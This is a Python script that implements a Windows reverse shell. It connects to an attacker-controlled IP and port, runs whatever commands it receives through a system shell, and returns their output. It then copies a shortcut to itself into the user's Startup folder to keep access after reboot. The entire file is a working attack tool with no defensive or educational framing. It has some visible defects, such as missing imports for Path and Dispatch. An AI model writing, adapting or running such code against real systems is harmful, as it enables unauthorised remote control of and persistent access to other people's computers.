#!/usr/bin/env python3

import socket
import subprocess
import sys
import os
import base64
import shutil

LHOST = "192.168.0.104"
LPORT = int("4444")

if len(sys.argv) == 3:
    LHOST = sys.argv[1]
    LPORT = int(sys.argv[2])



def reverse_shell(host: str, port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((host, port))

        sock.send(b"[+] Connected\n")

        while True:
            try:
                command = sock.recv(4096).decode("utf-8", errors="replace").strip()

                if not command:
                    break

                if command.lower() in ("exit", "quit"):
                    sock.send(b"[-] Closing connection\n")
                    break

                proc = subprocess.run(
                    command, shell=True, capture_output=True, timeout=30
                )

                output = proc.stdout + proc.stderr
                # Пробуємо різні кодування Windows
                for enc in ("cp866", "cp1251", "cp437", "koi8-r"):
                    try:
                        text = output.decode(enc)
                        break
                    except:
                        continue
                else:
                    text = output.decode("utf-8", errors="replace")
                sock.send(text.encode("utf-8", errors="replace"))

            except subprocess.TimeoutExpired:
                sock.send(b"[-] Command timed out\n")
            except Exception as e:
                sock.send(f"[-] Error: {str(e)}\n".encode())

    except ConnectionRefusedError:
        print(f"[-] Connection refused: {host}:{port}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    finally:
        sock.close()


def add_to_startup():
    if not getattr(sys, "frozen", False):
        raise RuntimeError("Цей код потрібно запускати із зібраного PyInstaller .exe")

    exe_path = str(Path(sys.executable).resolve())

    startup = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    shortcut_path = os.path.join(startup, "MyApp.lnk")

    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.WorkingDirectory = str(Path(exe_path).parent)
    shortcut.IconLocation = exe_path
    shortcut.Save()
    

if __name__ == "__main__":
    reverse_shell(LHOST, LPORT)
    add_to_startup()

    
